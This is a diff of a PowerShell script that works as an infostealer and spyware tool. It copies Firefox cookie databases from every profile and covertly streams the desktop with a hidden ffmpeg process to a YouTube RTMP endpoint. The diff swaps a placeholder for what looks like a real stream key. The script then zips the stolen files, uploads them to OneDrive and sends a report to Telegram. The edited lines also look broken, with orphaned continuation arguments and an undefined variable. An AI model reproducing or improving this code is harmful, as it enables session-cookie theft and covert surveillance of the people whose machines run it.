@@ -37,6 +37,8 @@ function Get-FirefoxCookies {
         Get-ChildItem -Directory $profiles | ForEach-Object {
             $cookieFile = "$($_.FullName)\cookies.sqlite"
             if (Test-Path $cookieFile) {
+                Write-Output "Found cookie at: $path"
+                Test-Path $cookieDir
                 Copy-Item $cookieFile "$cookieDir\firefox_$($_.Name).sqlite" -Force
             }
         }
@@ -134,8 +136,8 @@ function Start-Recording {
             -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`"" -PassThru
         $proc.WaitForExit()
     } elseif ($Mode -eq "stream") {
-        Start-Process -FilePath $ffmpeg `
-            -ArgumentList "-f gdigrab -framerate 15 -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY" `
+        $proc = Start-Process -FilePath $ffmpeg -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/wqrj-k80s-cwwq-7wct-3rc8" -WindowStyle Hidden -NoNewWindow -PassThru
+        $proc.WaitForExit()
             -RedirectStandardOutput "$tempDir\stream.log" `
             -RedirectStandardError "$tempDir\stream_error.log" `
             -WindowStyle Hidden
@@ -182,9 +184,10 @@ Cookies: $cookieCount
         }
 
         Start-Sleep -Seconds 2
-        Compress-Archive -Path $paths -DestinationPath $finalZip -Force
+        Compress-Archive -Path $paths -DestinationPath $finalZip -Force -Verbose
 
         Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
+        $report | ConvertTo-Json -Depth 5 | Out-File "$tempDir\report_debug.json"
         Send-Telegram -Report $report -FilesCount $filesCount -CookiesCount $cookieCount
     } catch {
         Write-Warning "Report empty, telegram skipped: $_"
